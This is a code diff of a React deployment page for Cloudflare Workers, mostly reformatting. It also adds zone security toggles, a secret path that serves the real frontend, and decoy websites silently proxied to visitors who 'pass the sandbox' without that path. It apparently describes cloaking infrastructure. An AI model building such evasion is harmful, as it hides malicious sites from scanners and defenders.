+                    <Link2 size={13} /> Save & Verify
+                  </>
+                )}
               </button>
               {cfConnected && (
                 <>
-                  <span style={{ fontSize: 11, color: "#22c55e" }}>Credentials verified and saved</span>
+                  <span style={{ fontSize: 11, color: "#22c55e" }}>
+                    Credentials verified and saved
+                  </span>
                   <button
                     onClick={handleDeleteKey}
                     disabled={deletingKey}
                     title="Remove saved API key and credentials"
                     style={{
-                      marginLeft: "auto", padding: "7px 14px", borderRadius: 8, border: "1px solid #7f1d1d",
-                      background: "transparent", color: "#f87171", fontSize: 12, fontWeight: 500,
-                      cursor: deletingKey ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 5,
+                      marginLeft: "auto",
+                      padding: "7px 14px",
+                      borderRadius: 8,
+                      border: "1px solid #7f1d1d",
+                      background: "transparent",
+                      color: "#f87171",
+                      fontSize: 12,
+                      fontWeight: 500,
+                      cursor: deletingKey ? "wait" : "pointer",
+                      display: "flex",
+                      alignItems: "center",
+                      gap: 5,
                       opacity: deletingKey ? 0.6 : 1,
                     }}
                   >
-                    <Trash2 size={12} /> {deletingKey ? "Deleting…" : "Delete API Key"}
+                    <Trash2 size={12} />{" "}
+                    {deletingKey ? "Deleting…" : "Delete API Key"}
                   </button>
                 </>
               )}
             </div>
 
             {cfError && (
-              <div style={{ display: "flex", alignItems: "center", gap: 6, color: "#f87171", fontSize: 12 }}>
+              <div
+                style={{
+                  display: "flex",
+                  alignItems: "center",
+                  gap: 6,
+                  color: "#f87171",
+                  fontSize: 12,
+                }}
+              >
                 <AlertCircle size={13} /> {cfError}
               </div>
             )}
 
-            <div style={{ padding: "11px 13px", background: "#0d1420", border: "1px solid #1e2d3d", borderRadius: 8, display: "flex", gap: 10 }}>
-              <Info size={13} color="#3b82f6" style={{ marginTop: 1, flexShrink: 0 }} />
+            <div
+              style={{
+                padding: "11px 13px",
+                background: "#0d1420",
+                border: "1px solid #1e2d3d",
+                borderRadius: 8,
+                display: "flex",
+                gap: 10,
+              }}
+            >
+              <Info
+                size={13}
+                color="#3b82f6"
+                style={{ marginTop: 1, flexShrink: 0 }}
+              />
               <div style={{ fontSize: 11, color: "#64748b", lineHeight: 1.7 }}>
-                <strong style={{ color: "#94a3b8" }}>API Token:</strong> dash.cloudflare.com → My Profile → API Tokens → Create Token → Workers:Edit template<br />
-                <strong style={{ color: "#94a3b8" }}>Account ID:</strong> dash.cloudflare.com → select account → Overview → right sidebar
+                <strong style={{ color: "#94a3b8" }}>API Token:</strong>{" "}
+                dash.cloudflare.com → My Profile → API Tokens → Create Token →
+                Workers:Edit template plus Zone Settings:Read and Zone
+                Settings:Edit
+                <br />
+                <strong style={{ color: "#94a3b8" }}>Account ID:</strong>{" "}
+                dash.cloudflare.com → select account → Overview → right sidebar
+                <br />
+                <strong style={{ color: "#94a3b8" }}>Zone ID:</strong>{" "}
+                select your domain → Overview → API section
+                <br />
+                <strong style={{ color: "#94a3b8" }}>
+                  KV Namespace ID:
+                </strong>{" "}
+                Workers &amp; Pages → KV → select namespace → Namespace ID on
+                the right
+              </div>
+            </div>
+          </div>
+        </Section>
+
+        {/* ── Section 5: Security ───────────────────────────────────────── */}
+        <Section label="Security">
+          <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
+            {/* Cloudflare zone protection */}
+            <div
+              style={{
+                padding: "13px 14px",
+                background: "#0d1420",
+                border: "1px solid #1e2d3d",
+                borderRadius: 8,
+                display: "flex",
+                flexDirection: "column",
+                gap: 12,
+              }}
+            >
+              <div>
+                <div
+                  style={{
+                    fontSize: 11,
+                    fontWeight: 600,
+                    color: "#94a3b8",
+                    letterSpacing: "0.06em",
+                    textTransform: "uppercase",
+                  }}
+                >
+                  Cloudflare Zone Protection
+                </div>
+                <div
+                  style={{
+                    fontSize: 11,
+                    color: "#475569",
+                    lineHeight: 1.6,
+                    marginTop: 4,
+                  }}
+                >
+                  Manage live Cloudflare settings here without opening the
+                  dashboard. Changes apply to the configured zone immediately.
+                </div>
+              </div>
+
+              <div
+                style={{
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "space-between",
+                  gap: 12,
+                }}
+              >
+                <div>
+                  <div style={{ fontSize: 13, color: "#cbd5e1", fontWeight: 600 }}>
+                    Bot Fight Mode
+                  </div>
+                  <div style={{ fontSize: 11, color: "#475569", marginTop: 3 }}>
+                    Challenge known automated traffic at Cloudflare’s edge.
+                  </div>
+                </div>
+                <button
+                  type="button"
+                  aria-pressed={botFightMode === "on"}
+                  onClick={() => handleBotFightMode(botFightMode !== "on")}
+                  disabled={
+                    !cfConnected ||
+                    !securityAvailable ||
+                    securityLoading ||
+                    securitySaving
+                  }
+                  style={{
+                    minWidth: 82,
+                    padding: "8px 12px",
+                    borderRadius: 7,
+                    border: `1px solid ${botFightMode === "on" ? "#166534" : "#334155"}`,
+                    background: botFightMode === "on" ? "#14532d" : "#172033",
+                    color: botFightMode === "on" ? "#86efac" : "#94a3b8",
+                    fontSize: 12,
+                    fontWeight: 600,
+                    cursor:
+                      !cfConnected ||
+                      !securityAvailable ||
+                      securityLoading ||
+                      securitySaving
+                        ? "not-allowed"
+                        : "pointer",
+                    opacity:
+                      !cfConnected ||
+                      !securityAvailable ||
+                      securityLoading ||
+                      securitySaving
+                        ? 0.55
+                        : 1,
+                  }}
+                >
+                  {securitySaving ? "Saving…" : botFightMode === "on" ? "Enabled" : "Disabled"}
+                </button>
+              </div>
+
+              <div style={{ display: "flex", flexDirection: "column", gap: 7 }}>
+                <label
+                  style={{
+                    fontSize: 11,
+                    color: "#64748b",
+                    fontWeight: 600,
+                    letterSpacing: "0.06em",
+                    textTransform: "uppercase",
+                  }}
+                >
+                  Security Level
+                </label>
+                <select
+                  value={securityLevel ?? ""}
+                  onChange={(e) =>
+                    handleSecurityLevel(e.target.value as SecurityLevel)
+                  }
+                  disabled={
+                    !cfConnected ||
+                    !securityAvailable ||
+                    securityLoading ||
+                    securitySaving
+                  }
+                  style={{
+                    width: "100%",
+                    padding: "9px 12px",
+                    background: "#0d1117",
+                    border: "1px solid #1e2d3d",
+                    borderRadius: 8,
+                    color: "#cbd5e1",
+                    fontSize: 12,
+                    outline: "none",
+                    cursor:
+                      !cfConnected ||
+                      !securityAvailable ||
+                      securityLoading ||
+                      securitySaving
+                        ? "not-allowed"
+                        : "pointer",
+                    opacity:
+                      !cfConnected ||
+                      !securityAvailable ||
+                      securityLoading ||
+                      securitySaving
+                        ? 0.55
+                        : 1,
+                  }}
+                >
+                  <option value="" disabled>
+                    {securityLoading ? "Loading Cloudflare settings…" : "Select a security level"}
+                  </option>
+                  <option value="essentially_off">Essentially off</option>
+                  <option value="low">Low</option>
+                  <option value="medium">Medium</option>
+                  <option value="high">High</option>
+                  <option value="under_attack">I’m under attack</option>
+                </select>
+              </div>
+
+              {!cfConnected && (
+                <div style={{ fontSize: 11, color: "#f97316" }}>
+                  Save and verify the Cloudflare connection to enable these controls.
+                </div>
+              )}
+              {cfConnected && !securityAvailable && !securityLoading && (
+                <div style={{ fontSize: 11, color: "#f97316" }}>
+                  Add a valid Zone ID and a token with Zone Settings read/edit
+                  permissions, then reconnect.
+                </div>
+              )}
+              {securityError && (
+                <div
+                  style={{
+                    display: "flex",
+                    alignItems: "flex-start",
+                    gap: 6,
+                    color: "#f87171",
+                    fontSize: 11,
+                    lineHeight: 1.5,
+                  }}
+                >
+                  <AlertCircle size={13} style={{ marginTop: 1, flexShrink: 0 }} />
+                  <span>{securityError}</span>
+                </div>
+              )}
+              {securityAvailable && !securityError && (
+                <div style={{ fontSize: 11, color: "#22c55e" }}>
+                  Live settings loaded from Cloudflare.
+                </div>
+              )}
+            </div>
+
+            {/* Secret Code Path */}
+            <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
+              <label
+                style={{
+                  fontSize: 11,
+                  fontWeight: 600,
+                  color: "#64748b",
+                  letterSpacing: "0.06em",
+                  textTransform: "uppercase",
+                }}
+              >
+                Secret Code Path
+              </label>
+              <input
+                type="text"
+                value={publicCodePath}
+                onChange={(e) => setPublicCodePath(e.target.value)}
+                placeholder="/x7k9p2m"
+                style={{
+                  width: "100%",
+                  padding: "9px 12px",
+                  background: "#0d1117",
+                  border: "1px solid #1e2d3d",
+                  borderRadius: 8,
+                  color: "#e2e8f0",
+                  fontSize: 13,
+                  outline: "none",
+                  fontFamily: "monospace",
+                }}
+              />
+              <div style={{ fontSize: 11, color: "#374151" }}>
+                The path prefix that serves your frontend. Requests to this
+                exact path <em>and</em> any sub-path beneath it (HTML, JS, CSS,
+                fonts, API calls) are all transparently proxied to your frontend
+                URL. Everyone else sees a proxy of a random website. Must start
+                with <code style={{ color: "#64748b" }}>/</code> and be hard to
+                guess — e.g.{" "}
+                <code style={{ color: "#64748b" }}>/x7k9p2m</code>
+              </div>
+            </div>
+
+            {/* Proxy Websites */}
+            <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
+              <label
+                style={{
+                  fontSize: 11,
+                  fontWeight: 600,
+                  color: "#64748b",
+                  letterSpacing: "0.06em",
+                  textTransform: "uppercase",
+                }}
+              >
+                Proxy Websites
+              </label>
+              <div style={{ fontSize: 11, color: "#374151", marginBottom: 4 }}>
+                Visitors who pass the sandbox but don't have the correct path
+                are silently proxied to one of these websites. They see real
+                content — no redirect. Add at least one.{" "}
+                <strong>NOTE: Empty boxes are ignored!</strong>
+              </div>
+              <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
+                {decoyDomains.map((url, i) => (
+                  <div
+                    key={i}
+                    style={{ display: "flex", alignItems: "center", gap: 8 }}
+                  >
+                    <span
+                      style={{
+                        fontSize: 11,
+                        color: "#374151",
+                        width: 40,
+                        flexShrink: 0,
+                      }}
+                    >
+                      URL {i + 1}
+                    </span>
+                    <input
+                      type="url"
+                      value={url}
+                      placeholder="https://example.com"
+                      onChange={(e) =>
+                        setDecoyDomains((prev) => {
+                          const next = [...prev];
+                          next[i] = e.target.value;
+                          return next;
+                        })
+                      }
+                      style={{
+                        flex: 1,
+                        padding: "7px 10px",
+                        background: "#0d1117",
+                        border: "1px solid #1e2d3d",
+                        borderRadius: 7,
+                        color: "#e2e8f0",
+                        fontSize: 12,
+                        outline: "none",
+                        fontFamily: "monospace",
+                      }}
+                    />
+                  </div>
+                ))}
+              </div>
+            </div>
+
+            {/* KV Binding Name */}
+            <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
+              <label
+                style={{
+                  fontSize: 11,
+                  fontWeight: 600,
+                  color: "#64748b",
+                  letterSpacing: "0.06em",
+                  textTransform: "uppercase",
+                }}
+              >
+                KV Binding Name{" "}
+                <span
+                  style={{
+                    fontWeight: 400,
+                    textTransform: "none",
+                    letterSpacing: 0,
+                  }}
+                >
+                  (optional)
+                </span>
+              </label>
+              <input
+                type="text"
+                value={kvBindingName}
+                onChange={(e) => setKvBindingName(e.target.value)}
+                placeholder="CODE_STORE"
+                style={{
+                  width: "100%",
+                  padding: "9px 12px",
+                  background: "#0d1117",
+                  border: "1px solid #1e2d3d",
+                  borderRadius: 8,
+                  color: "#e2e8f0",
+                  fontSize: 13,
+                  outline: "none",
+                  fontFamily: "monospace",
+                }}
+              />
+              <div style={{ fontSize: 11, color: "#374151" }}>
+                The name your Worker code uses to access the KV store (e.g.{" "}
+                <code style={{ color: "#64748b" }}>env.CODE_STORE</code>). Leave
+                blank to use{" "}
+                <code style={{ color: "#64748b" }}>CODE_STORE</code>. Must match
+                the binding name in your Cloudflare KV namespace settings.
               </div>
             </div>
           </div>
@@ -704,18 +1628,40 @@ export default function Deploy() {
 
       {/* ── RIGHT COLUMN: Preview + Deploy ── */}
       <div style={{ display: "flex", flexDirection: "column", gap: 20 }}>
-
         {/* Sticky wrapper */}
         <div style={{ position: "sticky", top: 24 }}>
-
           {/* Preview panel */}
           <div style={{ marginBottom: 20 }}>
-            <div style={{ fontSize: 11, fontWeight: 600, color: "#374151", letterSpacing: "0.08em", textTransform: "uppercase", marginBottom: 10 }}>
+            <div
+              style={{
+                fontSize: 11,
+                fontWeight: 600,
+                color: "#374151",
+                letterSpacing: "0.08em",
+                textTransform: "uppercase",
+                marginBottom: 10,
+              }}
+            >
               Live Preview
             </div>
-            <WorkerPreview templateId={template} accentColor={selectedTemplate.color} />
-            <div style={{ fontSize: 11, color: "#374151", marginTop: 8, textAlign: "center" }}>
-              Previewing: <span style={{ color: "#93c5fd" }}>{selectedTemplate.label}</span> header · <span style={{ color: "#93c5fd" }}>{selectedClient?.name ?? clientAlias}</span>
+            <WorkerPreview
+              templateId={template}
+              accentColor={selectedTemplate.color}
+            />
+            <div
+              style={{
+                fontSize: 11,
+                color: "#374151",
+                marginTop: 8,
+                textAlign: "center",
+              }}
+            >
+              Previewing:{" "}
+              <span style={{ color: "#93c5fd" }}>{selectedTemplate.label}</span>{" "}
+              header ·{" "}
+              <span style={{ color: "#93c5fd" }}>
+                {selectedClient?.name ?? clientAlias}
+              </span>
             </div>
           </div>
 
@@ -738,7 +1684,10 @@ export default function Deploy() {
               color: !cfConnected ? "#475569" : "white",
               fontSize: 14,
               fontWeight: 700,
-              cursor: !cfConnected || deployStatus === "deploying" ? "not-allowed" : "pointer",
+              cursor:
+                !cfConnected || deployStatus === "deploying"
+                  ? "not-allowed"
+                  : "pointer",
               display: "flex",
               alignItems: "center",
               justifyContent: "center",
@@ -747,38 +1696,90 @@ export default function Deploy() {
             }}
           >
             {deployStatus === "deploying" ? (
-              <><Cloud size={16} style={{ animation: "spin 1s linear infinite" }} /> Deploying…</>
+              <>
+                <Cloud
+                  size={16}
+                  style={{ animation: "spin 1s linear infinite" }}
+                />{" "}
+                Deploying…
+              </>
             ) : deployStatus === "success" ? (
-              <><CheckCircle2 size={16} /> Deployed Successfully</>
+              <>
+                <CheckCircle2 size={16} /> Deployed Successfully
+              </>
             ) : (
-              <><Rocket size={16} /> Deploy to Cloudflare Workers</>
+              <>
+                <Rocket size={16} /> Deploy to Cloudflare Workers
+              </>
             )}
           </button>
 
           {!cfConnected && (
-            <div style={{ fontSize: 11, color: "#475569", textAlign: "center", marginTop: 8 }}>
+            <div
+              style={{
+                fontSize: 11,
+                color: "#475569",
+                textAlign: "center",
+                marginTop: 8,
+              }}
+            >
               Connect Cloudflare credentials first
             </div>
           )}
 
           {/* Status messages */}
           {(deployStatus === "success" || deployedUrl) && deployedUrl && (
-            <div style={{ marginTop: 14, padding: "12px 14px", background: "#052e16", border: "1px solid #166534", borderRadius: 8 }}>
-              <div style={{ display: "flex", alignItems: "center", gap: 6, color: "#4ade80", fontSize: 12, fontWeight: 600, marginBottom: 8 }}>
+            <div
+              style={{
+                marginTop: 14,
+                padding: "12px 14px",
+                background: "#052e16",
+                border: "1px solid #166534",
+                borderRadius: 8,
+              }}
+            >
+              <div
+                style={{
+                  display: "flex",
+                  alignItems: "center",
+                  gap: 6,
+                  color: "#4ade80",
+                  fontSize: 12,
+                  fontWeight: 600,
+                  marginBottom: 8,
+                }}
+              >
                 <CheckCircle2 size={13} /> Worker deployed!
               </div>
-              <div style={{ fontSize: 11, color: "#64748b", marginBottom: 6 }}>Your Worker is live at:</div>
+              <div style={{ fontSize: 11, color: "#64748b", marginBottom: 6 }}>
+                Your Worker is live at:
+              </div>
               <a
                 href={deployedUrl}
                 target="_blank"
                 rel="noopener noreferrer"
-                style={{ fontSize: 12, color: "#60a5fa", fontFamily: "monospace", wordBreak: "break-all", display: "flex", alignItems: "center", gap: 5, textDecoration: "none", marginBottom: 12 }}
+                style={{
+                  fontSize: 12,
+                  color: "#60a5fa",
+                  fontFamily: "monospace",
+                  wordBreak: "break-all",
+                  display: "flex",
+                  alignItems: "center",
+                  gap: 5,
+                  textDecoration: "none",
+                  marginBottom: 12,
+                }}
               >
                 {deployedUrl} <ExternalLink size={11} />
               </a>
               {deployedScriptName && (
-                <div style={{ fontSize: 11, color: "#374151", marginBottom: 10 }}>
-                  Script: <span style={{ fontFamily: "monospace", color: "#64748b" }}>{deployedScriptName}</span>
+                <div
+                  style={{ fontSize: 11, color: "#374151", marginBottom: 10 }}
+                >
+                  Script:{" "}
+                  <span style={{ fontFamily: "monospace", color: "#64748b" }}>
+                    {deployedScriptName}
+                  </span>
                 </div>
               )}
 
@@ -787,31 +1788,66 @@ export default function Deploy() {
                 onClick={handleTestWorker}
                 disabled={testStatus === "testing"}
                 style={{
-                  width: "100%", padding: "7px 12px", borderRadius: 7,
+                  width: "100%",
+                  padding: "7px 12px",
+                  borderRadius: 7,
                   border: `1px solid ${testStatus === "ok" ? "#166534" : testStatus === "error" ? "#7f1d1d" : "#1e3a5f"}`,
-                  background: testStatus === "ok" ? "#052e16" : testStatus === "error" ? "#2d0a0a" : "#0d1e35",
-                  color: testStatus === "ok" ? "#4ade80" : testStatus === "error" ? "#f87171" : "#93c5fd",
-                  fontSize: 12, fontWeight: 500,
+                  background:
+                    testStatus === "ok"
+                      ? "#052e16"
+                      : testStatus === "error"
+                        ? "#2d0a0a"
+                        : "#0d1e35",
+                  color:
+                    testStatus === "ok"
+                      ? "#4ade80"
+                      : testStatus === "error"
+                        ? "#f87171"
+                        : "#93c5fd",
+                  fontSize: 12,
+                  fontWeight: 500,
                   cursor: testStatus === "testing" ? "wait" : "pointer",
-                  display: "flex", alignItems: "center", justifyContent: "center", gap: 6,
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  gap: 6,
                   marginBottom: 6,
                   opacity: testStatus === "testing" ? 0.7 : 1,
                   transition: "all 0.15s",
                 }}
               >
-                <Activity size={12} style={{ animation: testStatus === "testing" ? "spin 1s linear infinite" : "none" }} />
-                {testStatus === "testing" ? "Testing…" : testStatus === "ok" ? "Test passed" : testStatus === "error" ? "Test failed — retry" : "Test Worker"}
+                <Activity
+                  size={12}
+                  style={{
+                    animation:
+                      testStatus === "testing"
+                        ? "spin 1s linear infinite"
+                        : "none",
+                  }}
+                />
+                {testStatus === "testing"
+                  ? "Testing…"
+                  : testStatus === "ok"
+                    ? "Test passed"
+                    : testStatus === "error"
+                      ? "Test failed — retry"
+                      : "Test Worker"}
               </button>
 
               {/* Test result */}
               {testMsg && (
-                <div style={{
-                  fontSize: 11, fontFamily: "monospace", marginBottom: 10,
-                  padding: "6px 10px", borderRadius: 6,
-                  background: testStatus === "ok" ? "#052e16" : "#2d0a0a",
-                  color: testStatus === "ok" ? "#86efac" : "#fca5a5",
-                  border: `1px solid ${testStatus === "ok" ? "#166534" : "#7f1d1d"}`,
-                }}>
+                <div
+                  style={{
+                    fontSize: 11,
+                    fontFamily: "monospace",
+                    marginBottom: 10,
+                    padding: "6px 10px",
+                    borderRadius: 6,
+                    background: testStatus === "ok" ? "#052e16" : "#2d0a0a",
+                    color: testStatus === "ok" ? "#86efac" : "#fca5a5",
+                    border: `1px solid ${testStatus === "ok" ? "#166534" : "#7f1d1d"}`,
+                  }}
+                >
                   {testMsg}
                 </div>
               )}
@@ -820,43 +1856,127 @@ export default function Deploy() {
                 onClick={handleDeleteWorker}
                 disabled={deletingWorker}
                 style={{
-                  width: "100%", padding: "7px 12px", borderRadius: 7, border: "1px solid #7f1d1d",
-                  background: "transparent", color: "#f87171", fontSize: 12, fontWeight: 500,
-                  cursor: deletingWorker ? "wait" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 6,
+                  width: "100%",
+                  padding: "7px 12px",
+                  borderRadius: 7,
+                  border: "1px solid #7f1d1d",
+                  background: "transparent",
+                  color: "#f87171",
+                  fontSize: 12,
+                  fontWeight: 500,
+                  cursor: deletingWorker ? "wait" : "pointer",
+                  display: "flex",
+                  alignItems: "center",
+                  justifyContent: "center",
+                  gap: 6,
                   opacity: deletingWorker ? 0.6 : 1,
                 }}
               >
-                <Trash2 size={12} /> {deletingWorker ? "Deleting worker…" : "Delete Worker from Cloudflare"}
+                <Trash2 size={12} />{" "}
+                {deletingWorker
+                  ? "Deleting worker…"
+                  : "Delete Worker from Cloudflare"}
               </button>
             </div>
           )}
 
           {deleteWorkerMsg && !deployedUrl && (
-            <div style={{ marginTop: 14, padding: "10px 14px", background: "#0d1420", border: "1px solid #1e2d3d", borderRadius: 8, fontSize: 12, color: "#94a3b8" }}>
+            <div
+              style={{
+                marginTop: 14,
+                padding: "10px 14px",
+                background: "#0d1420",
+                border: "1px solid #1e2d3d",
+                borderRadius: 8,
+                fontSize: 12,
+                color: "#94a3b8",
+              }}
+            >
               {deleteWorkerMsg}
             </div>
           )}
 
           {deployStatus === "error" && deployMsg && (
-            <div style={{ marginTop: 14, padding: "12px 14px", background: "#2d0a0a", border: "1px solid #7f1d1d", borderRadius: 8, display: "flex", alignItems: "flex-start", gap: 6 }}>
-              <AlertCircle size={13} color="#f87171" style={{ marginTop: 1, flexShrink: 0 }} />
+            <div
+              style={{
+                marginTop: 14,
+                padding: "12px 14px",
+                background: "#2d0a0a",
+                border: "1px solid #7f1d1d",
+                borderRadius: 8,
+                display: "flex",
+                alignItems: "flex-start",
+                gap: 6,
+              }}
+            >
+              <AlertCircle
+                size={13}
+                color="#f87171"
+                style={{ marginTop: 1, flexShrink: 0 }}
+              />
               <div style={{ fontSize: 12, color: "#f87171" }}>{deployMsg}</div>
             </div>
           )}
 
           {/* Summary strip */}
-          <div style={{ marginTop: 16, padding: "12px 14px", background: "#0d1117", border: "1px solid #1e2d3d", borderRadius: 8 }}>
-            <div style={{ fontSize: 10, fontWeight: 600, color: "#374151", letterSpacing: "0.08em", textTransform: "uppercase", marginBottom: 10 }}>
+          <div
+            style={{
+              marginTop: 16,
+              padding: "12px 14px",
+              background: "#0d1117",
+              border: "1px solid #1e2d3d",
+              borderRadius: 8,
+            }}
+          >
+            <div
+              style={{
+                fontSize: 10,
+                fontWeight: 600,
+                color: "#374151",
+                letterSpacing: "0.08em",
+                textTransform: "uppercase",
+                marginBottom: 10,
+              }}
+            >
               Deployment Config
             </div>
             {[
               { label: "Template", value: selectedTemplate.label },
               { label: "Client", value: selectedClient?.name ?? clientAlias },
-              { label: "Region", value: REGIONS.find((r) => r.id === region)?.label ?? region },
+              {
+                label: "Region",
+                value: REGIONS.find((r) => r.id === region)?.label ?? region,
+              },
+              { label: "Secret Path", value: publicCodePath || "not set" },
+              {
+                label: "KV Bound",
+                value: kvNamespaceId ? "yes" : "no (rate limiting disabled)",
+              },
             ].map((row) => (
-              <div key={row.label} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
-                <span style={{ fontSize: 11, color: "#475569" }}>{row.label}</span>
-                <span style={{ fontSize: 11, color: "#94a3b8", fontWeight: 500 }}>{row.value}</span>
+              <div
+                key={row.label}
+                style={{
+                  display: "flex",
+                  justifyContent: "space-between",
+                  alignItems: "center",
+                  marginBottom: 6,
+                }}
+              >
+                <span style={{ fontSize: 11, color: "#475569" }}>
+                  {row.label}
+                </span>
+                <span
+                  style={{
+                    fontSize: 11,
+                    color:
+                      row.label === "KV Bound" && !kvNamespaceId
+                        ? "#f97316"
+                        : "#94a3b8",
+                    fontWeight: 500,
+                  }}
+                >
+                  {row.value}
+                </span>
               </div>
             ))}
           </div>
